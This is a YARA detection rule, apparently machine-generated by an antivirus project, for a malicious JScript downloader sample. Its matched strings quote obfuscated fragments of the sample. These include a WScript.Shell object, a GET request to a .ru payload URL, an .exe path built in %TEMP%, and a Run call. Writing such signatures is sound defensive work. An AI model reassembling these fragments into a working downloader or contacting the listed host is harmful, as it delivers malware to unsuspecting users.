rule sig_20160330_e9013be980cdae091832f8b1efd7861a {
  meta:
    description = "datamaliciousorder - file 20160330_e9013be980cdae091832f8b1efd7861a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f3dcf3df7e6cdfd01efba2079df5e28b4a32a2ef132670c1aa87b2540bbe3171"

  strings:
    $s1  = "function X(MT, X0){F0 = F0 * 1; return MT - X0;};" fullword ascii
    $s2  = "var YR = function AX() {return WScript[LK](\"WScript\"+\".Shell\");}(), V0 = 11;" fullword ascii
    $s3  = "UG[F](\"GET\", \"http://jafes.ru/b0ros\", false);" fullword ascii
    $s4  = "if (UG[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DX(){return Z0 + \"\";};" fullword ascii
    $s6  = "function V() {return YR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qSIHTBOnhrX.ex\" + \"e\";};" fullword ascii
    $s7  = "function FR() {return ((E0 == true) && (E0 == HS)) ? 1 : F0;};" fullword ascii
    $s8  = "function P(A0){YR[\"Run\"](A0, F0, F0);};" fullword ascii
    $s9  = "function C(){return 22;};" fullword ascii
    $s10 = "function D0()" fullword ascii
    $s11 = "var SM = new this[\"Date\"]();" fullword ascii
    $s12 = "function E(){return LK;};" fullword ascii
    $s13 = "function D(PA) {var YA = (1, 2, 3, 4, 5, PA); return YA;};" fullword ascii
    $s14 = "return X(KY, KW);" fullword ascii
    $s15 = "}while (D1);" fullword ascii
    $s16 = "var E0 = false;" fullword ascii
    $s17 = "E0 = true; " fullword ascii
    $s18 = "var V1 = false;" fullword ascii
    $s19 = "var HS = false;" fullword ascii
    $s20 = "HS = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}